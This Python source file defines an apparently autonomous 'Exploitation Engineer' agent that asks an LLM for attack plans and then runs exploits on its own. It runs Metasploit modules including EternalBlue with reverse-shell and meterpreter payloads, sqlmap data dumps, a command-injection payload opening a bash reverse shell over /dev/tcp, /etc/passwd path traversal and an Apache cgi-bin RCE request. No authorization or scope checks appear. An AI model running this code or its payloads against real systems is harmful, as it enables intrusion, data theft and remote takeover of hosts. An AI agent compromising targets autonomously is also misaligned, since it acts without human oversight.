"""
Exploitation Engineer Agent - Weaponizes vulnerabilities and compromises targets
"""

import os
import sys
import time
import json
import re
from pathlib import Path
from typing import Dict, Any, List, Optional

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from mumei.shared.base_agent import BaseAgent
from mumei.shared.models import Event, EventType, Priority, Session
from mumei.shared.prompts import get_agent_prompt

import logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class ExploitationEngineer(BaseAgent):
    """
    Exploitation Engineer weaponizes identified vulnerabilities and attempts to compromise targets.
    """

    def __init__(self, agent_id: str):
        """
        Initialize Exploitation Engineer.

        Args:
            agent_id: Unique agent identifier
        """
        super().__init__(agent_id=agent_id, agent_type="exploitation_engineer")

        self.system_prompt = get_agent_prompt("exploitation_engineer")
        self.active_sessions: Dict[str, Session] = {}

        logger.info(f"Exploitation Engineer {agent_id} initialized")

    def handle_vulnerability_identified(self, event: Event) -> None:
        """
        Handle VulnerabilityIdentified event and attempt exploitation.

        Args:
            event: VulnerabilityIdentified event
        """
        try:
            vuln_data = event.data

            cve_id = vuln_data.get("cve_id")
            title = vuln_data.get("title")
            cvss_score = vuln_data.get("cvss_score", 0)
            exploit_available = vuln_data.get("exploit_available", False)
            service_id = vuln_data.get("service_id")

            self.log("INFO", f"Received vulnerability: {title} (CVE: {cve_id}, CVSS: {cvss_score})")

            # Only attempt exploitation if exploit is available and CVSS is high enough
            if not exploit_available:
                self.log("INFO", f"No exploit available for {title}, skipping")
                return

            if cvss_score < 7.0:
                self.log("INFO", f"CVSS score {cvss_score} below threshold, skipping")
                return

            # Query State Manager for more context (simplified for now)
            self.log("INFO", f"Analyzing vulnerability for exploitation...")

            # Use LLM to decide exploitation strategy
            user_message = f"""
Vulnerability Identified:
- Title: {title}
- CVE: {cve_id}
- CVSS Score: {cvss_score}
- Service ID: {service_id}
- Description: {vuln_data.get('description', 'N/A')}

Analyze this vulnerability and suggest:
1. The best exploitation approach
2. Specific tools or exploits to use (Metasploit modules, manual exploits, etc.)
3. The exact CLI commands to run
4. How to verify successful exploitation

Provide a detailed exploitation plan.
"""

            response = self.llm.chat(
                system_prompt=self.system_prompt,
                user_message=user_message,
                temperature=0.5,
            )

            self.log("INFO", f"LLM exploitation plan: {response[:400]}...")

            # Attempt exploitation based on vulnerability type
            if cve_id:
                self.exploit_by_cve(cve_id, vuln_data)
            else:
                self.exploit_by_type(title, vuln_data)

        except Exception as e:
            self.log("ERROR", f"Error handling vulnerability: {e}", exc_info=True)

    def exploit_by_cve(self, cve_id: str, vuln_data: Dict[str, Any]) -> None:
        """
        Exploit vulnerability by CVE ID.

        Args:
            cve_id: CVE identifier
            vuln_data: Vulnerability data
        """
        try:
            self.log("INFO", f"Attempting exploitation of {cve_id}...")

            # Search for Metasploit module
            search_result = self.execute_cli(
                f"msfconsole -q -x 'search cve:{cve_id}; exit'",
                timeout=30
            )

            if search_result["success"] and "exploit/" in search_result["stdout"]:
                self.log("INFO", f"Found Metasploit module for {cve_id}")

                # Extract module name (simplified)
                module_match = re.search(r'(exploit/[^\s]+)', search_result["stdout"])
                if module_match:
                    module_name = module_match.group(1)
                    self.log("INFO", f"Using module: {module_name}")

                    # Attempt exploitation with Metasploit
                    self.exploit_with_metasploit(module_name, vuln_data)
            else:
                self.log("INFO", f"No Metasploit module found for {cve_id}")

                # Try searchsploit
                searchsploit_result = self.execute_cli(
                    f"searchsploit {cve_id}",
                    timeout=30
                )

                if searchsploit_result["success"]:
                    self.log("INFO", f"Searchsploit results: {searchsploit_result['stdout'][:200]}")

        except Exception as e:
            self.log("ERROR", f"Error exploiting {cve_id}: {e}")
            self.publish_exploitation_failed(vuln_data, str(e))

    def exploit_by_type(self, title: str, vuln_data: Dict[str, Any]) -> None:
        """
        Exploit vulnerability by type/title.

        Args:
            title: Vulnerability title
            vuln_data: Vulnerability data
        """
        try:
            title_lower = title.lower()

            if "sql injection" in title_lower:
                self.exploit_sql_injection(vuln_data)
            elif "command injection" in title_lower:
                self.exploit_command_injection(vuln_data)
            elif "path traversal" in title_lower:
                self.exploit_path_traversal(vuln_data)
            elif "eternalblue" in title_lower or "ms17-010" in title_lower:
                self.exploit_eternalblue(vuln_data)
            else:
                self.log("INFO", f"No specific exploit handler for: {title}")

        except Exception as e:
            self.log("ERROR", f"Error exploiting {title}: {e}")
            self.publish_exploitation_failed(vuln_data, str(e))

    def exploit_with_metasploit(self, module_name: str, vuln_data: Dict[str, Any]) -> None:
        """
        Exploit using Metasploit module.

        Args:
            module_name: Metasploit module name
            vuln_data: Vulnerability data
        """
        try:
            self.log("INFO", f"Exploiting with Metasploit module: {module_name}")

            # Get attacker IP (simplified - should be from config)
            attacker_ip = "192.168.1.100"

            # Build Metasploit command
            msf_commands = f"""
use {module_name}
set RHOSTS target
set LHOST {attacker_ip}
set PAYLOAD linux/x64/shell_reverse_tcp
exploit
"""

            # Execute Metasploit (simplified - in production, use RPC)
            result = self.execute_cli(
                f"msfconsole -q -x '{msf_commands}'",
                timeout=300
            )

            if result["success"]:
                # Check for successful exploitation
                if "session" in result["stdout"].lower() or "meterpreter" in result["stdout"].lower():
                    self.log("INFO", "Exploitation successful! Session established")
                    self.publish_host_compromised(vuln_data, "meterpreter", "www-data")
                else:
                    self.log("WARN", "Exploitation may have failed")
                    self.publish_exploitation_failed(vuln_data, "No session established")

        except Exception as e:
            self.log("ERROR", f"Error with Metasploit exploitation: {e}")
            self.publish_exploitation_failed(vuln_data, str(e))

    def exploit_sql_injection(self, vuln_data: Dict[str, Any]) -> None:
        """Exploit SQL injection vulnerability"""
        try:
            self.log("INFO", "Attempting SQL injection exploitation...")

            # Use sqlmap for exploitation
            target_url = "http://target/vulnerable.php?id=1"  # Simplified

            result = self.execute_cli(
                f"sqlmap -u '{target_url}' --batch --dump --threads=5",
                timeout=300
            )

            if result["success"] and "database" in result["stdout"].lower():
                self.log("INFO", "SQL injection successful - data extracted")
                # In a real scenario, we'd try to get a shell via sqlmap --os-shell
            else:
                self.log("WARN", "SQL injection exploitation failed")

        except Exception as e:
            self.log("ERROR", f"Error exploiting SQL injection: {e}")

    def exploit_command_injection(self, vuln_data: Dict[str, Any]) -> None:
        """Exploit command injection vulnerability"""
        try:
            self.log("INFO", "Attempting command injection exploitation...")

            # Test command injection
            test_payload = "; id"
            result = self.execute_cli(
                f"curl 'http://target/vulnerable.php?cmd={test_payload}'",
                timeout=30
            )

            if result["success"] and "uid=" in result["stdout"]:
                self.log("INFO", "Command injection confirmed!")

                # Establish reverse shell
                reverse_shell_payload = "; bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
                self.execute_cli(
                    f"curl 'http://target/vulnerable.php?cmd={reverse_shell_payload}'",
                    timeout=30
                )

                self.publish_host_compromised(vuln_data, "shell", "www-data")

        except Exception as e:
            self.log("ERROR", f"Error exploiting command injection: {e}")

    def exploit_path_traversal(self, vuln_data: Dict[str, Any]) -> None:
        """Exploit path traversal vulnerability"""
        try:
            self.log("INFO", "Attempting path traversal exploitation...")

            # Test path traversal
            result = self.execute_cli(
                "curl 'http://target/vulnerable.php?file=../../../../etc/passwd'",
                timeout=30
            )

            if result["success"] and "root:" in result["stdout"]:
                self.log("INFO", "Path traversal confirmed - /etc/passwd accessible")

                # Try to escalate to RCE if possible
                # (Apache 2.4.49/2.4.50 path traversal to RCE)
                rce_result = self.execute_cli(
                    "curl 'http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'echo Content-Type: text/plain; echo; id'",
                    timeout=30
                )

                if rce_result["success"] and "uid=" in rce_result["stdout"]:
                    self.log("INFO", "Escalated path traversal to RCE!")
                    self.publish_host_compromised(vuln_data, "shell", "www-data")

        except Exception as e:
            self.log("ERROR", f"Error exploiting path traversal: {e}")

    def exploit_eternalblue(self, vuln_data: Dict[str, Any]) -> None:
        """Exploit EternalBlue (MS17-010) vulnerability"""
        try:
            self.log("INFO", "Attempting EternalBlue exploitation...")

            attacker_ip = "192.168.1.100"

            msf_commands = """
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set LHOST {attacker_ip}
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
""".format(attacker_ip=attacker_ip)

            result = self.execute_cli(
                f"msfconsole -q -x '{msf_commands}'",
                timeout=300
            )

            if result["success"] and "meterpreter" in result["stdout"].lower():
                self.log("INFO", "EternalBlue exploitation successful!")
                self.publish_host_compromised(vuln_data, "meterpreter", "SYSTEM")
            else:
                self.log("WARN", "EternalBlue exploitation failed")
                self.publish_exploitation_failed(vuln_data, "Exploit failed")

        except Exception as e:
            self.log("ERROR", f"Error exploiting EternalBlue: {e}")

    def publish_host_compromised(
        self,
        vuln_data: Dict[str, Any],
        session_type: str,
        user: str,
        privileges: str = "user"
    ) -> None:
        """Publish HostCompromised event"""
        try:
            service_id = vuln_data.get("service_id")
            host_id = vuln_data.get("host_id", "unknown")

            session = Session(
                host_id=host_id,
                session_type=session_type,
                user=user,
                privileges=privileges,
                metadata={
                    "exploited_vulnerability": vuln_data.get("title"),
                    "cve_id": vuln_data.get("cve_id"),
                }
            )

            self.active_sessions[session.session_id] = session

            self.publish_event(
                EventType.HOST_COMPROMISED,
                data=session.model_dump(),
                priority=Priority.CRITICAL,
            )

            self.log("INFO", f"Published HostCompromised event for {host_id}")

        except Exception as e:
            self.log("ERROR", f"Error publishing host compromised: {e}")

    def publish_exploitation_failed(self, vuln_data: Dict[str, Any], reason: str) -> None:
        """Publish ExploitationFailed event"""
        try:
            self.publish_event(
                EventType.EXPLOITATION_FAILED,
                data={
                    "vulnerability_id": vuln_data.get("vulnerability_id"),
                    "title": vuln_data.get("title"),
                    "cve_id": vuln_data.get("cve_id"),
                    "reason": reason,
                },
                priority=Priority.INFO,
            )

            self.log("INFO", f"Published ExploitationFailed event: {reason}")

        except Exception as e:
            self.log("ERROR", f"Error publishing exploitation failed: {e}")

    def run(self) -> None:
        """Main agent loop"""
        self.running = True
        self.log("INFO", "Exploitation Engineer starting...")

        try:
            # Subscribe to VulnerabilityIdentified events
            self.subscribe_to_events([EventType.VULNERABILITY_IDENTIFIED], self.handle_vulnerability_identified)

            # Main loop - send heartbeats
            while self.running:
                self.send_heartbeat()
                time.sleep(30)

        except KeyboardInterrupt:
            self.log("INFO", "Received interrupt signal")
        except Exception as e:
            self.log("ERROR", f"Error in main loop: {e}", exc_info=True)
        finally:
            self.shutdown()


def main():
    """Main entry point"""
    agent_id = os.getenv("AGENT_ID", "exploitation_engineer_01")

    agent = ExploitationEngineer(agent_id=agent_id)
    agent.run()


if __name__ == "__main__":
    main()
